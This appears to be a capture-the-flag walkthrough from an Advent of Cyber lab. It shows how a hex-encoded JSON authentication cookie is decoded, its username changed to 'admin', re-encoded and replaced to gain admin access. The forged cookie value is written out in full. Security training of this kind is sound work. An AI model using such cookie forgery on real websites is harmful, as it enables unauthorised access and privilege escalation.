# Cookies Manipulation

What can we do except signing up! right! nothing! let sign up then!
![****](/Advent%20of%20Cyber%203/Screenshots/Task2/signup.PNG)

Let check the console! and see what's going on!

![****](/Advent%20of%20Cyber%203/Screenshots/Task2/cookies.PNG)


## Here's our cookie!
```user-auth:7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a22746573746572363636227d```

- At the first look, we notice that this is a hexadecimal Value! Let try to convert it using online tools and see what's hides behind it! 
---[!CyberChef](https://gchq.github.io/CyberChef/)

```json
{company: "The Best Festival Company", isregistered:"True", username:"tester666"}
```

- BoOooOOM! We see the username that we attempted to sign up with!
- Let ask ourselves, Hmmmm! can we change that? Yes we can!
```{company: "The Best Festival Company", isregistered:"True", username:"admin"}```

### The Website accepts only the Encoded Values! Means we have to replace it with Hex! Thanks to **CyberChef** for that
```
7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a2261646d696e227d
```

![****](/Advent%20of%20Cyber%203/Screenshots/Task2/in.PNG)

- Out of sudden a page comes up in our browser!


## We're in! Amazing Hackers!